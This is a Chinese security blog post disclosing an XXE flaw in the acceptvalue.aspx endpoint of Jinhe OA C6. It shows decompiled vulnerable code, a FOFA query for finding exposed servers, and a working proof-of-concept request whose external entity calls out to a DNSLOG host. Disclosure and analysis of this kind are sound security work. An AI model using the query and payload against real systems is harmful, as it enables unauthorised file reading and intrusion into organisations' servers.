---
title: "金和OA acceptvalue.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-acceptvalue-xxe.html
asset_dir: assets/金和oa-acceptvalue.aspx-xxe漏洞
---

# 金和OA acceptvalue.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/3 13:30
- 449浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

SQL注入防护

漏洞扫描器

漏洞预警服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `acceptvalue.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `acceptvalue.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Archives.dll` 将其进行反编译后找到 **acceptvalue** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

深入探索

Web安全课程

安全认证考试

安全

## XXE

```
POST /c6/Jhsoft.Web.Archives/acceptvalue.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA acceptvalue.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
